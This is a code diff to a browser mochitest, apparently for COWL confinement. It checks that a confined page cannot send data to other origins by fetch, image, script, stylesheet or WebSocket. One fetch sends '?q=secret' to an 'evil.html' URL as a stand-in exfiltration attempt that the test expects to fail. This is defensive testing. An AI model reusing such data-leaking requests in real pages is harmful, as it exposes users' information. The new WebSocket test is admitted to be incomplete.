@@ -10,7 +10,7 @@
 
   function testFetch() {
     // try sending a fetch req to somewhere....
-    fetch('http://example.com/tests/dom/tests/mochitest/cowl/evil.html?q=secret').then(function(res) {
+    fetch('http://example.com/tests/dom/tests/mochitest/cowl/confinement/evil.html?q=secret').then(function(res) {
       wwParent.ok_wrapper(false, 'Should not be able to communicate with arbitrary origins');
       }).catch(function(err) {
       wwParent.ok_wrapper(true, 'Should not be able to communicate with arbitrary origins');
@@ -19,7 +19,7 @@
 
   function testConstructImage() {
     var img = document.createElement('img');
-    img.src = 'http://example.com/tests/dom/tests/mochitest/cowl/jupiter.jpg';
+    img.src = 'http://example.com/tests/dom/tests/mochitest/cowl/confinement/jupiter.jpg';
 
     img.onload = function() {
       wwParent.ok_wrapper(false, 'Should not load image after reading sensitive information');
@@ -31,7 +31,7 @@
 
   function testConstructScript() {
     var script = document.createElement('script');
-    script.src = 'http://example.com/tests/dom/tests/mochitest/cowl/evil_script.js';
+    script.src = 'http://example.com/tests/dom/tests/mochitest/cowl/confinement/evil_script.js';
 
     script.onload = function() {
       wwParent.ok_wrapper(false, 'Should not load script after reading sensitive information');
@@ -40,12 +40,49 @@
       wwParent.ok_wrapper(true, 'Should not load script after reading sensitive information');
     };
     document.body.appendChild(script);
-
   }
+
+  function testConstructCSSLink() {
+    var link = document.createElement('link');
+    link.rel = 'stylesheet';
+    link.type = 'text/css';
+    link.href = 'http://example.com/tests/dom/tests/mochitest/cowl/confinement/style.css';
+
+    link.onload = function() {
+      wwParent.ok_wrapper(false, 'Should not load link after reading sensitive information');
+    };
+    link.onerror = function() {
+      wwParent.ok_wrapper(true, 'Should not load script after reading sensitive information');
+    };
+    document.body.appendChild(link);
+  }
+
+  // Does not seem to fully work, does not open websocket even if unconfined, probably something with mochitest setup?
+  function testWebSockets() {
+    var wss;
+
+    try {
+      wss = new WebSocket('wss://example.com/tests/dom/tests/mochitest/cowl/confinement/file_websocket');
+    } catch(e) {
+      wwParent.ok_wrapper(true, "Should not be able to open websocket connection when confined");
+    }
+
+    wss.onopen = function(e) {
+      wwParent.ok_wrapper(false, "Should not be able to open websocket connection when confined");
+      wss.close();
+    };
+
+    wss.onerror = function(e) {
+      wwParent.ok_wrapper(true, "Should not be able to open websocket connection when confined");
+    };
+  }
+
 
   testFetch();
   testConstructImage();
   testConstructScript();
+  testConstructCSSLink();
+  testWebSockets();
 
 </script>
 </body>
